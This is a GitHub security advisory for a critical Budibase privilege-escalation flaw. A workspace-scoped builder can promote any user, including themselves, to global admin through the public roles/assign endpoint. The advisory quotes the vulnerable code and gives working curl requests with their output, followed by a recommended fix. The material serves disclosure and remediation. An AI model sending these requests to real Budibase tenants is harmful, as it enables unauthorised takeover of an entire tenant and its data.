# [C] Budibase: Workspace-scoped builder escalates to global admin via /api/public/v1/roles/assign

## Summary
Severity: Critical
Advisory: GHSA-6xp4-cf37-ppjh
CVE: CVE-2026-48150
CWE: CWE-915
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:L (CVSS_V3)
Published: 2026-06-12
Source: https://github.com/advisories/GHSA-6xp4-cf37-ppjh
Type: github-advisory

## Affected
- npm: `@budibase/server` — affected >=0 <3.39.0

## Details
## Summary

`/api/public/v1/roles/assign` is guarded by the `builderOrAdmin` middleware, which passes any user who is a builder for the app id in the `x-budibase-app-id` header. That check admits both global builders and workspace-scoped builders (`builder.apps` set but `builder.global` unset). The controller then spreads the request body into the SDK call, and the SDK grants `builder.global=true` or `admin.global=true` on whichever user ids the caller supplies. Bob, a workspace-scoped builder with an API key, promotes himself or any other user to global admin with one POST. The whole flow is tenant-wide privilege escalation from an app-level role, available to anyone with an Enterprise license that unlocks the `EXPANDED_PUBLIC_API` feature.

## Details

Controller (`packages/server/src/api/controllers/public/roles.ts:13-17`):

```typescript
export async function assignAppBuilder(ctx: Ctx) {
  const { userIds, ...assignmentProps } = ctx.request.body
  await sdk.publicApi.roles.assign(userIds, assignmentProps)
  ctx.body = { data: { userIds } }
}
```

Nothing filters `assignmentProps`. The request body's `builder` and `admin` keys flow directly into the SDK.

SDK (`packages/pro/src/sdk/publicApi/roles.ts:17-47`):

```typescript
export async function assign(userIds: string[], opts: AssignmentOpts) {
  if (!(await isExpandedPublicApiEnabled())) {
    throw new Error("Unable to assign roles - license required.")
  }
  const users = await userDB.bulkGet(userIds)
  for (let user of users) {
    // ...
    if (opts.builder) {
      user.builder = { global: true }
    }
    if (opts.admin) {
      user.admin = { global: true }
    }
  }
  await userDB.bulkUpdate(users)
}
```

No check that the caller already holds the privilege they are granting. `user.builder` is overwritten unconditionally, which also strips any existing `builder.apps` scope from the target.

Route guard (`packages/backend-core/src/middleware/builderOrAdmin.ts:6-20`):

```typescript
export async function builderOrAdmin(ctx: UserCtx, next: any) {
  if (ctx.internal || isAdmin(ctx.user)) { return next() }
  const workspaceId = await getWorkspaceIdFromCtx(ctx)
  if (!workspaceId && !env.isWorker()) {
    ctx.throw(403, "This request required a workspace id.")
  } else if (!workspaceId && !hasBuilderPermissions(ctx.user)) {
    ctx.throw(403, "Admin/Builder user only endpoint.")
  } else if (workspaceId && !isBuilder(ctx.user, workspaceId)) {
    ctx.throw(403, "Workspace Admin/Builder user only endpoint.")
  }
  // passes
}
```

`isBuilder(user, workspaceId)` returns true for any user whose `builder.apps` array contains the workspace id, even when `builder.global` is unset. The endpoint therefore trusts an app-level builder with a global-scope grant.

## Proof of Concept

Tested on Budibase 3.35.8 (master at f960e361). The public API license gate at `roles.ts:18` was disabled in the test bundle so the underlying privilege-escalation could be reproduced end-to-end; on a licensed Enterprise tenant the gate passes and the same requests land.

Step 1: the admin creates two users. Alice is a workspace-scoped builder on an app (`builder.apps: [app_...]`, `builder.global` unset, `admin.global` unset). Victim is a BASIC user.

Step 2: Alice calls `GET /api/global/self/api_key` to mint an API key tied to her identity:

```bash
curl -sS -b alice "$BASE/api/global/self/api_key"
# → {"apiKey":"80f28...","userId":"us_dab...","createdAt":"..."}
```

Step 3: Alice calls `/api/public/v1/roles/assign` with the victim's id and `builder: true`. She scopes the request to her own app via `x-budibase-app-id` so `builderOrAdmin` passes:

```bash
curl -sS -X POST "$BASE/api/public/v1/roles/assign" \
  -H "Content-Type: application/json" \
  -H "x-budibase-api-key: $ALICE_APIKEY" \
  -H "x-budibase-app-id: $APP_ID" \
  -d '{"userIds":["us_70b6...victim"],"builder":true}'
```

Admin verifies:

```
BEFORE: builder: {'global': False} admin: {'global': False}
ATTACK: HTTP 200 {"data":{"userIds":["us_70b6..."]}}
AFTER:  builder: {'global': True}  admin: {'global': False}
```

Step 4: Alice follows up with `"admin": true` and can target her own id:

```bash
curl -sS -X POST "$BASE/api/public/v1/roles/assign" \
  -H "Content-Type: application/json" \
  -H "x-budibase-api-key: $ALICE_APIKEY" \
  -H "x-budibase-app-id: $APP_ID" \
  -d '{"userIds":["us_dab...alice"],"admin":true}'
```

```
AFTER: builder: {'apps': ['app_...']} admin: {'global': True}
```

Alice is now a global admin of the tenant. She kept `builder.apps` because the SDK only overwrites the keys it was asked to set; `admin: true` writes `admin = { global: true }` without touching `builder`.

## Impact

Every workspace-scoped builder of any app in the tenant is one request away from global admin. Global admin grants unrestricted access to the tenant: every app in every workspace, every user, every datasource credential, every automation, every SCIM / OIDC / audit-log config. The mass-assignment also strips scoping from the target's existing role, so downgrading a legitimate global builder to an app-scoped builder fails: a later call reinstates `global: true`.

A tenant that shares app-building duties across teams (the common Enterprise pattern) cannot hold the per-app boundary with the current middleware. This matches GHSA-2g39-332f-68p9 (Critical Privilege Escalation & IDOR via Missing RBAC) in shape and impact.

## Recommended Fix

Enforce the caller's privilege in the SDK, matching the grant they want to make:

```typescript
// packages/pro/src/sdk/publicApi/roles.ts:32-43
const caller = context.getIdentity() // or however the SDK resolves the caller
if (opts.builder) {
  if (!caller?.builder?.global && !caller?.admin?.global) {
    throw new HTTPError("Only global builders or admins can grant global builder", 403)
  }
  user.builder = { global: true }
}
if (opts.admin) {
  if (!caller?.admin?.global) {
    throw new HTTPError("Only global admins can grant global admin", 403)
  }
  user.admin = { global: true }
}
```

Alternative, equally valid: tighten `builderOrAdmin` so that endpoints which can set global-scope properties require `isGlobalBuilder` or `isAdmin`. That fixes this endpoint and any future endpoint that shares the middleware.

Whichever fix lands, also strip `builder` and `admin` from `assignmentProps` at the controller boundary (`packages/server/src/api/controllers/public/roles.ts:14`) unless the caller has `admin.global=true`. Defense-in-depth against a future SDK regression.

---
*Found by [aisafe.io](https://aisafe.io)*

## References
- https://github.com/Budibase/budibase/security/advisories/GHSA-6xp4-cf37-ppjh
- https://nvd.nist.gov/vuln/detail/CVE-2026-48150
- https://github.com/Budibase/budibase
